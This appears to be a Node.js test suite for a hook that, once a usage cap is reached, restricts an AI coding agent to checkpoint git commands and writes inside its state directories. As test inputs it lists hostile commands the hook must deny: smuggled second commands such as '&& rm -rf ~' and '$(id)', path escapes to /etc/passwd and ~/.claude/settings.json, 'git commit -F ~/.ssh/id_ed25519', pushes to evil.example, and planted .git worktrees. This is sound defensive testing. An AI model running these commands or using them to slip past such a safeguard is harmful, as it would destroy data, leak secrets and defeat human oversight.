import { test, before } from 'node:test';
import assert from 'node:assert';
import {
  mkdtempSync, mkdirSync, symlinkSync, writeFileSync, realpathSync, linkSync, copyFileSync,
  readFileSync,
} from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { DEFAULTS } from '../lib/config.mjs';

const GUARD = fileURLToPath(new URL('../scripts/usage-guard.mjs', import.meta.url));
const tmp = realpathSync(mkdtempSync(path.join(tmpdir(), 'abw-guard-')));
const STATE = path.join(tmp, 'state');
const RUNS = path.join(tmp, 'runs-not-created-yet', 'deeper');
const HOME = path.join(tmp, 'home');
mkdirSync(STATE, { recursive: true });
mkdirSync(HOME, { recursive: true });
process.env.ABW_STATE_DIR = STATE;
process.env.ABW_RUNS_DIR = RUNS;
process.env.HOME = HOME;

const { decide } = await import('../scripts/usage-guard.mjs');

const NOW = 1_800_000_000;
const okUsage = { state: 'ok', fiveHour: { pct: 10, resetsAt: NOW + 1 }, sevenDay: null, capturedAt: NOW };
const cappedUsage = { state: 'ok', fiveHour: { pct: 80, resetsAt: NOW + 1 }, sevenDay: null, capturedAt: NOW };
const cfg = { ...DEFAULTS };
const capped = (input) => decide({ cwd: tmp, ...input }, { usage: cappedUsage, config: cfg, home: HOME });
const bash = (command) => ({ tool_name: 'Bash', tool_input: { command } });
const write = (file_path, tool_name = 'Write') => ({ tool_name, tool_input: { file_path } });

before(() => {
  mkdirSync(path.join(tmp, 'outside'));
  symlinkSync(path.join(tmp, 'outside'), path.join(STATE, 'escape'));
  symlinkSync(path.join(tmp, 'outside', 'nope'), path.join(STATE, 'dangling'));
  writeFileSync(path.join(tmp, 'outside', 'secret'), 'x');
  linkSync(path.join(tmp, 'outside', 'secret'), path.join(STATE, 'hardlink'));
});

test('under the cap decide returns null even for destructive commands', () => {
  const r = decide({ cwd: tmp, ...bash('rm -rf /tmp/x') }, { usage: okUsage, config: cfg, home: HOME });
  assert.strictEqual(r, null);
});

test('capped deny reason is the exact copy', () => {
  const r = capped({ tool_name: 'Read', tool_input: { file_path: '/x' } });
  assert.strictEqual(
    r.deny,
    'Usage cap reached (5h 80% ≥ cap 75%). Write your checkpoint to the ticket plan, ' +
      'commit and push the WIP branch, then return RESULT {"outcome":"capped"}. ' +
      'No other tool calls are allowed.',
  );
});

test('capped: checkpoint operations are allowed', () => {
  assert.strictEqual(capped(write(`${STATE}/run.json`)), null);
  assert.strictEqual(capped(write(`${STATE}/new/dir/run.json`, 'Edit')), null);
  assert.strictEqual(capped(write(`${RUNS}/LAR-1.md`, 'MultiEdit')), null);
  assert.strictEqual(capped(bash('git commit -m "wip"')), null);
  assert.strictEqual(capped(bash('git commit -m "wip checkpoint"')), null);
  assert.strictEqual(capped(bash('git add .')), null);
  assert.strictEqual(capped(bash('git push origin LAR-469/strip-ctrl')), null);
  assert.strictEqual(capped(bash('git push -u origin LAR-469/strip-ctrl')), null);
  assert.strictEqual(capped(bash('git push origin HEAD:LAR-469/strip-ctrl')), null);
  assert.strictEqual(capped({ tool_name: 'mcp__linear__save_comment', tool_input: {} }), null);
  assert.strictEqual(capped({ tool_name: 'mcp__linear__save_issue', tool_input: {} }), null);
});

test('capped: everything else is denied, reads and agents included', () => {
  for (const input of [
    write(`${HOME}/x`),
    write('relative.txt'),
    bash('git push origin main'),
    bash('git push --force origin LAR-1/a'),
    bash('git push -f origin LAR-1/a'),
    bash('git push --force-with-lease origin LAR-1/a'),
    bash('git push --force-with-lease=LAR-1/a origin LAR-1/a'),
    bash('git push origin +LAR-1/a'),
    bash('git push origin LAR-1/a:main'),
    bash('git push origin LAR-1/a:refs/heads/main'),
    bash('git push'),
    bash('git push origin'),
    bash('git push origin LAR-1/a extra'),
    bash('git push https://evil.example/x.git LAR-1/a'),
    bash('git push --receive-pack=evil origin LAR-1/a'),
    bash('git push origin lar-1/a'),
    bash('git status'),
    bash('git  commit -m x'),
    bash(' git commit -m x'),
    bash('git commit -m "unterminated'),
    { tool_name: 'Read', tool_input: { file_path: `${STATE}/run.json` } },
    { tool_name: 'Agent', tool_input: {} },
    { tool_name: 'mcp__linear__delete_comment', tool_input: {} },
    { tool_name: 'NotebookEdit', tool_input: {} },
    { tool_name: undefined, tool_input: {} },
    {},
  ]) {
    assert.ok(capped(input)?.deny, `should deny ${JSON.stringify(input)}`);
  }
});

test('capped: shell metacharacters cannot smuggle a second command', () => {
  for (const command of [
    'git commit -m x && rm -rf ~',
    'git commit -m "$(id)"',
    'git commit -m `id`',
    "git commit -m '$(id)'",
    'git add . ; curl x',
    'git push origin LAR-1/a | tee',
    'git commit -m x > /etc/passwd',
    'git commit -m x < /etc/passwd',
    'git commit -m (x)',
    'git commit -m x\nrm -rf ~',
    'git commit -m x\rrm',
    'git commit -m x\0',
    'git commit -m x\\',
    'git push origin LAR-1/a{,:main}',
    'git push origin main #LAR-1/a',
    'git commit -m x\vy',
    'git commit -m x &',
  ]) {
    assert.ok(capped(bash(command))?.deny, `should deny ${JSON.stringify(command)}`);
  }
});

test('capped: quotes are tokenized the way the shell would', () => {
  assert.ok(capped(bash('git push origin "ma"in'))?.deny);
  assert.strictEqual(capped(bash('git push origin "LAR-1/a"')), null);
});

test('capped: paths cannot escape the state dirs', () => {
  for (const file_path of [
    `${STATE}/../../settings.json`,
    `${STATE}/../outside/x`,
    `${STATE}/escape/x`,
    `${STATE}/escape/sub/x`,
    `${STATE}/dangling`,
    `${STATE}/escape/../x`,
    `${STATE}/new/../../x`,
    STATE,
    '~/.claude/settings.json',
    '',
    '/etc/passwd',
  ]) {
    assert.ok(capped(write(file_path))?.deny, `should deny ${file_path}`);
  }
  assert.ok(capped({ tool_name: 'Write', tool_input: {} })?.deny);
  assert.ok(capped({ tool_name: 'Write', tool_input: { file_path: 5 } })?.deny);
});

test('capped: relative paths resolve against the hook cwd', () => {
  assert.strictEqual(capped({ cwd: STATE, ...write('run.json') }), null);
  assert.ok(capped({ cwd: path.join(STATE, '..'), ...write('run.json') })?.deny);
  assert.ok(capped({ cwd: undefined, ...write('run.json') })?.deny);
});

test('stale or missing usage denies with the reason', () => {
  const missing = { state: 'missing', fiveHour: null, sevenDay: null, capturedAt: null };
  const stale = { ...okUsage, state: 'stale' };
  const input = { cwd: tmp, tool_name: 'Read', tool_input: {} };
  assert.match(decide(input, { usage: missing, config: cfg, home: HOME }).deny, /no usage reading/);
  assert.match(decide(input, { usage: stale, config: cfg, home: HOME }).deny, /stale/);
});

// CLI: spawn the real script, as the hook runner does.
const runCli = (stdin, env = {}) =>
  spawnSync(process.execPath, [GUARD], {
    input: stdin,
    encoding: 'utf8',
    env: { ...process.env, ...env },
  });

const snapshotFile = (pct) => {
  const p = path.join(tmp, `snap-${pct}.json`);
  const now = Date.now() / 1000;
  writeFileSync(
    p,
    JSON.stringify({
      captured_at: now,
      rate_limits: { five_hour: { used_percentage: pct, resets_at: now + 3600 } },
    }),
  );
  return p;
};
const cfgFile = path.join(tmp, 'config.yml');
writeFileSync(cfgFile, 'usage_cap_5h: 75\n');
const hook = JSON.stringify({ cwd: tmp, hook_event_name: 'PreToolUse', ...bash('rm -rf /tmp/x') });

test('CLI: capped prints deny JSON, uncapped prints nothing', () => {
  const env = { ABW_CONFIG: cfgFile };
  const a = runCli(hook, { ...env, ABW_SNAPSHOT: snapshotFile(90) });
  assert.strictEqual(a.status, 0);
  const out = JSON.parse(a.stdout).hookSpecificOutput;
  assert.strictEqual(out.hookEventName, 'PreToolUse');
  assert.strictEqual(out.permissionDecision, 'deny');
  assert.match(out.permissionDecisionReason, /^Usage cap reached \(5h 90% ≥ cap 75%\)/);
  const b = runCli(hook, { ...env, ABW_SNAPSHOT: snapshotFile(10) });
  assert.strictEqual(b.status, 0);
  assert.strictEqual(b.stdout, '');
});

test('CLI: bad stdin, bad config and missing snapshot fail closed with valid JSON', () => {
  const badCfg = path.join(tmp, 'bad.yml');
  writeFileSync(badCfg, 'nonsense_key: 1\n');
  const cases = [
    runCli('{not json', { ABW_CONFIG: cfgFile, ABW_SNAPSHOT: snapshotFile(10) }),
    runCli(hook, { ABW_CONFIG: badCfg, ABW_SNAPSHOT: snapshotFile(10) }),
    runCli('null', { ABW_CONFIG: cfgFile, ABW_SNAPSHOT: snapshotFile(10) }),
  ];
  for (const r of cases) {
    assert.strictEqual(r.status, 0);
    const out = JSON.parse(r.stdout).hookSpecificOutput;
    assert.strictEqual(out.permissionDecision, 'deny');
    assert.match(out.permissionDecisionReason, /^Usage guard error \(.+\) — denying to stay safe\.$/);
  }
  const missing = runCli(hook, { ABW_CONFIG: cfgFile, ABW_SNAPSHOT: path.join(tmp, 'none.json') });
  assert.match(JSON.parse(missing.stdout).hookSpecificOutput.permissionDecisionReason, /no usage reading/);
});

test('capped: glob and tilde expansion cannot rewrite the refspec or args', () => {
  for (const command of [
    'git push origin LAR-1/*',
    'git push origin LAR-1/[x]',
    'git push origin LAR-1/?',
    'git push origin "LAR-1/*"',
    'git add *',
    'git add ~/.ssh',
    'git commit -m x*',
  ]) {
    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
  }
});

test('capped: commit and add flags are a closed set, matched exactly', () => {
  for (const command of [
    'git commit -F /etc/hosts',
    'git commit -F ~/.ssh/id_ed25519',
    'git commit --fil=/etc/hosts',
    'git commit --file=/etc/hosts',
    'git commit -m x --template=/etc/hosts',
    'git commit --pathspec-from-file=/etc/hosts -m x',
    'git commit --mess=x',
    'git commit -m',
    'git commit -am x',
    'git commit foo.txt',
    'git add -f .env',
    'git add --force .env',
    'git add --pathspec-from-file=/etc/hosts',
    'git add --al',
  ]) {
    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
  }
  for (const command of [
    'git commit -m "-weird start"',
    'git commit --message=wip -a --no-verify -q',
    'git commit --all -m wip',
    'git add -A',
    'git add --all',
    'git add -u src',
    'git add --update',
    'git add -- -f',
    'git add src/a.js docs/b.md',
  ]) {
    assert.strictEqual(capped(bash(command)), null, `should allow ${command}`);
  }
});

test('capped: push remote is pinned to origin, and may not delete a branch', () => {
  assert.strictEqual(capped(bash('git push origin LAR-1/a')), null);
  for (const command of [
    'git push .. LAR-1/a',
    'git push . LAR-1/a',
    'git push /tmp/repo LAR-1/a',
    'git push upstream LAR-1/a',
    'git push evilrepo LAR-1/a',
    'git push origin :LAR-2/other',
  ]) {
    assert.ok(capped(bash(command))?.deny, `should deny ${command}`);
  }
});

test('capped: a hard link inside the state dir is denied', () => {
  assert.ok(capped(write(`${STATE}/hardlink`))?.deny);
});

test('capped: a relative home denies a ~/ path, even when it lands in the state dir', () => {
  // The state dir is <cwd>/relative, so the old expansion (`relative/x`, resolved against the
  // process cwd) would land inside it and be allowed.
  const saved = process.env.ABW_STATE_DIR;
  const prevCwd = process.cwd();
  const cwd = mkdtempSync(path.join(tmp, 'cwd-'));
  mkdirSync(path.join(cwd, 'relative'));
  process.env.ABW_STATE_DIR = path.join(cwd, 'relative');
  try {
    process.chdir(cwd);
    const r = decide({ cwd, ...write('~/x') }, { usage: cappedUsage, config: cfg, home: 'relative' });
    assert.ok(r?.deny);
  } finally {
    process.chdir(prevCwd);
    process.env.ABW_STATE_DIR = saved;
  }
});

test('CLI: a broken or missing lib fails closed instead of exiting 1 with no JSON', () => {
  for (const mode of ['throws', 'missing', 'hangs']) {
    const dir = mkdtempSync(path.join(tmp, 'copy-'));
    mkdirSync(path.join(dir, 'scripts'));
    mkdirSync(path.join(dir, 'lib'));
    copyFileSync(GUARD, path.join(dir, 'scripts', 'usage-guard.mjs'));
    if (mode === 'hangs') {
      // An import that never settles ends node with exit 13 and no output (fail open).
      writeFileSync(path.join(dir, 'lib', 'config.mjs'), 'await new Promise(() => {});\n');
      writeFileSync(path.join(dir, 'lib', 'usage.mjs'), 'export {};\n');
    }
    if (mode === 'throws') {
      writeFileSync(path.join(dir, 'lib', 'config.mjs'), "throw new Error('boom');\n");
      writeFileSync(path.join(dir, 'lib', 'usage.mjs'), 'export {};\n');
    }
    const r = spawnSync(process.execPath, [path.join(dir, 'scripts', 'usage-guard.mjs')], {
      input: hook,
      encoding: 'utf8',
    });
    assert.strictEqual(r.status, 0, mode);
    const out = JSON.parse(r.stdout).hookSpecificOutput;
    assert.strictEqual(out.permissionDecision, 'deny', mode);
    assert.match(out.permissionDecisionReason, /^Usage guard error/, mode);
  }
});

test('capped: git -C is allowed only for a real linked worktree named like a ticket', () => {
  const sh = (cwd, ...args) => {
    const r = spawnSync('git', args, { cwd, encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stderr);
  };
  const main = path.join(tmp, 'x', 'repo');
  mkdirSync(main, { recursive: true });
  sh(main, 'init', '-q');
  sh(main, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '--allow-empty', '-m', 'i');
  const wts = path.join(tmp, 'x', 'repo-worktrees');
  const wt = path.join(wts, 'LAR-1');
  sh(main, 'worktree', 'add', '-q', '-b', 'LAR-1/a', wt);
  assert.strictEqual(capped(bash(`git -C ${wt} add -A`)), null);
  assert.strictEqual(capped(bash(`git -C ${wt} commit -m wip`)), null);
  assert.strictEqual(capped(bash(`git -C ${wt} push origin LAR-1/a`)), null);

  const denied = (dir, why) =>
    assert.ok(capped(bash(`git -C ${dir} commit -m wip`)), `should deny: ${why}`);
  // The C1 sequence: Write a .git/config under runs, create it, then try to use the directory.
  const planted = path.join(RUNS, 'a-worktrees', 'LAR-2');
  assert.strictEqual(capped(write(path.join(planted, '.git', 'config'))), null);
  mkdirSync(path.join(planted, '.git'), { recursive: true });
  writeFileSync(path.join(planted, '.git', 'config'), '[core]\n');
  denied(planted, 'planted .git directory in runs');
  // A planted .git file in runs pointing at a planted gitdir in runs.
  const planted2 = path.join(RUNS, 'b-worktrees', 'LAR-3');
  const fakeGitdir = path.join(RUNS, 'b', '.git', 'worktrees', 'LAR-3');
  mkdirSync(planted2, { recursive: true });
  mkdirSync(fakeGitdir, { recursive: true });
  writeFileSync(path.join(planted2, '.git'), `gitdir: ${fakeGitdir}\n`);
  denied(planted2, 'planted .git file in runs');
  // Not a ticket id, and a real .git directory.
  mkdirSync(path.join(tmp, 'evil-worktrees', 'x'), { recursive: true });
  denied(path.join(tmp, 'evil-worktrees', 'x'), 'basename is not a ticket id');
  mkdirSync(path.join(tmp, 'evil-worktrees', 'LAR-9', '.git'), { recursive: true });
  denied(path.join(tmp, 'evil-worktrees', 'LAR-9'), '.git is a directory');
  // Nested inside the agent's own worktree.
  const nested = path.join(wt, 'inner-worktrees', 'LAR-3');
  mkdirSync(nested, { recursive: true });
  writeFileSync(path.join(nested, '.git'), readFileSync(path.join(wt, '.git'), 'utf8'));
  denied(nested, 'nested inside a worktree');
  // A .git file whose gitdir is outside the <X>/.git/worktrees/<name> shape.
  const odd = path.join(wts, 'LAR-4');
  mkdirSync(odd, { recursive: true });
  mkdirSync(path.join(tmp, 'x', 'plain-gitdir'));
  writeFileSync(path.join(odd, '.git'), `gitdir: ${path.join(tmp, 'x', 'plain-gitdir')}\n`);
  denied(odd, 'gitdir has the wrong shape');
  // A .git symlink, even to a valid gitdir file.
  const link = path.join(wts, 'LAR-5');
  mkdirSync(link, { recursive: true });
  symlinkSync(path.join(wt, '.git'), path.join(link, '.git'));
  denied(link, '.git is a symlink');
  // Other cases: main repo, the parent itself, relative dir, double -C, -C after subcommand.
  for (const cmd of [
    `git -C ${main} commit -m wip`,
    `git -C ${wts} commit -m wip`,
    'git -C LAR-1 commit -m wip',
    `git -C ${wt} -C ${wt} commit -m wip`,
    `git commit -C ${wt} -m wip`,
    `git -c core.editor=x -C ${wt} commit -m wip`,
    `git -C ${wt} status`,
  ]) assert.ok(capped(bash(cmd)), `should deny: ${cmd}`);
});

// The hook command string the agent ships. Claude Code only blocks on exit 2, so the guard must
// never exit 127 (no node), 1 or a signal code unnoticed.
const agentText = readFileSync(
  fileURLToPath(new URL('../agents/agentic-ticket-worker.md', import.meta.url)), 'utf8');
const HOOK_COMMAND = agentText.match(/^\s+command: '(.+)'$/m)[1];

function runHookCommand(env) {
  const home = path.join(tmp, `hookhome-${Math.random().toString(36).slice(2)}`);
  const scripts = path.join(home, '.claude', 'skills', 'agentic-backlog-worker', 'scripts');
  mkdirSync(scripts, { recursive: true });
  symlinkSync(GUARD, path.join(scripts, 'usage-guard.mjs'));
  return spawnSync('/bin/sh', ['-c', HOOK_COMMAND], {
    input: hook,
    encoding: 'utf8',
    env: { HOME: home, ABW_CONFIG: cfgFile, ABW_SNAPSHOT: snapshotFile(10), ...env },
  });
}

test('hook command: a working guard exits 0 (proves the harness before the failure cases)', () => {
  const r = runHookCommand({ PATH: process.env.PATH });
  assert.strictEqual(r.status, 0, r.stderr);
  assert.strictEqual(r.stdout, '');
});

test('hook command: node missing from PATH exits 2 so the call is blocked', () => {
  const r = runHookCommand({ PATH: path.join(tmp, 'no-node-here') });
  assert.strictEqual(r.status, 2, r.stderr);
});

test('hook command: a missing script exits 2 so the call is blocked', () => {
  const home = path.join(tmp, 'hookhome-empty');
  mkdirSync(home, { recursive: true });
  const r = spawnSync('/bin/sh', ['-c', HOOK_COMMAND], {
    input: hook, encoding: 'utf8', env: { HOME: home, PATH: process.env.PATH },
  });
  assert.strictEqual(r.status, 2, r.stderr);
});
